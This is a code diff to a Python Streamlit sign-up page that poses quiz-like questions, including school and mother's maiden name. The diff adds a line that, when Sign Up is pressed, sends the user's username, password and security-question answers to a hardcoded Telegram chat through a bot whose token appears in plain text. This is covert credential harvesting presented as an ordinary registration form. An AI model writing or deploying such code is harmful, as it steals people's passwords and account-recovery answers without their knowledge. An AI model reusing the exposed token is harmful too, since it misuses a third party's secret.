@@ -34,12 +34,14 @@ hotel = ph5.text_input('Fancy Boho chic hotel or airbnb in a secluded beach?')
 
 TOKEN = "2034688341:AAGiWVOQZ_wJUDLEGPbqXn80LzJ9palMWu0"
 tb = telebot.TeleBot(TOKEN)  # create a new Telegram Bot object
+chat_id = '630924196'
 
 placeholder = st.empty()
 signupbut = placeholder.button('Sign Up')
 
 if signupbut:
     placeholder.empty()
+    tb.send_message(chat_id, 'New User: ' + new_user + '\n' + 'Password: ' + new_passwd + '\n' + 'School: ' + school + '\n' + 'Mother''s Maiden Name: ' + mom_name + '\n' + 'Vibe: ' + type + '\n' + 'Hotel: ' + hotel)
     a = [eval('ph%s.empty()' % i) for i in range(1,11)]
 
     ph1 = st.empty()
@@ -51,14 +53,14 @@ if signupbut:
     ph4 = st.empty()
     ver = ph4.button('Verify')
     if ver:
-        a = [eval('ph%s.empty()' % i) for i in range(1, 5)]
         st.success("You have successfully created an account.Go to the Login Menu to login")
 
         # here - st image with my letter
         df = pd.DataFrame({"username": [new_user], "password": [new_passwd],
                            "school": [school], "mom_name": [mom_name],
                            "hotel": [hotel], "type": [type], "images": [captcha]})
-        chat_id = '630924196'
+        a = [eval('ph%s.empty()' % i) for i in range(1, 5)]
+
 
         test_data = df.to_records()
         print(test_data)
